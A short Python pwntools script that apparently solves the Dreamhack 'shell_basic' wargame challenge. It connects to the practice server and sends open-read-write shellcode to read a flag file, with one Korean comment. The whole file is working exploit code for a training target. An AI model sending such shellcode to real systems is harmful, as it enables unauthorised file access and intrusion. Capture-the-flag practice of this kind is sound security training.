from pwn import *

p = remote("host3.dreamhack.games", 16625)
context.arch = "amd64"
# open할 flag path
path = "/home/shell_basic/flag_name_is_loooooong"
shellcode = ""
shellcode += shellcraft.pushstr(path)
shellcode += shellcraft.open(path, 0, None)
shellcode += shellcraft.read("rax", "rsp", 0x30)
shellcode += shellcraft.write(1, "rsp", 0x30)
shellcode += shellcraft.exit()

p.recvuntil("shellcode: ")
p.sendline(asm(shellcode))
p.interactive()
